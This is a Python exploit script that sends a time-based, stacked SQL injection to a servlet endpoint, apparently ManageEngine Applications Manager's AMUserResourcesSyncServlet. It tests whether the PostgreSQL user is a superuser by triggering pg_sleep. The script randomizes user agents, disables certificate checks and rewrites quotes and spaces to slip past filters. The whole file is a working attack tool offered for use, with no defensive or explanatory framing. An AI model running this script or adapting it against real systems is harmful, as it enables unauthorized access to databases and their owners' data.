#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variables
url = "/servlet/AMUserResourcesSyncServlet"
params = "ForMasRange=1&userId=1"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def random_agent():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

#######
# ANY OTHER FUNCTION HERE
#######

# Main
def main(argv):
    if len(sys.argv) == 4:
        host = sys.argv[1]
        port = sys.argv[2]
        timing = sys.argv[3]
    else:
        print("[*] Usage: " + sys.argv[0] + " <host> <port> <time>\n")
        exit(0)
    
    # User Agent
    headers = random_agent()

    # Query variables
    sqli = ";"
    prefix = "select case when ("
    query = "select current_setting('is_superuser')"
    suffix = ")='on' then pg_sleep(" + str(timing) + ") end;-- "

    # Modify injection string via regex for character evasion
    inj_str = sqli + prefix + query + suffix
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$

    # Print original and modified query string
    print("\n[*] Original injection string:\n" + inj_str)
    print("\n[*] Regex modified injection string:\n" + inj_regex_str)

    # Do stuff
    try:

        r = requests.get("https://" + host + ":" + port + url, params=params + inj_regex_str, headers=headers, verify=False)
        print(r.text)
        print(r.headers)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
